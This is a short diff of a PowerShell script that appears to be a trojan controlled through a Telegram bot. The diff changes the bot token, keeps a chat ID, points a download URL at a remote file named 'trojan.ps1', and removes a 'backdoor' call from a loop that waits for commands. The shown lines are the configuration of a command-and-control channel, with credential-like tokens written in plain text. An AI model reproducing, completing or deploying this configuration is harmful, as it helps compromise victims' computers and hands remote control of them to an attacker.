@@ -4,7 +4,7 @@ $PSDefaultParameterValues['Invoke-WebRequest:UseBasicParsing'] = $true
 ## CONFIG ##
 ############
 
-$BotToken = "6835846192:AAFYo5QjhTl44rYGhSr__j1yQXh15l9waWI"
+$BotToken = "6760679794:AAFtPTlPHxzcnxrrqNTQF66oT7CraQThfus"
 $ChatID = '6542327314'
 $githubScript = 'https://raw.githubusercontent.com/Hiki0611/ROBOT/main/trojan.ps1'
 $ipv4Regex = '^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
@@ -596,8 +596,6 @@ Invoke-WebRequest `
 ######################
 ## WAIT FOR COMMAND ##
 ######################
-
-backdoor
 
 #Time to sleep for each loop before checking if a message with the magic word was received
 $LoopSleep = 3
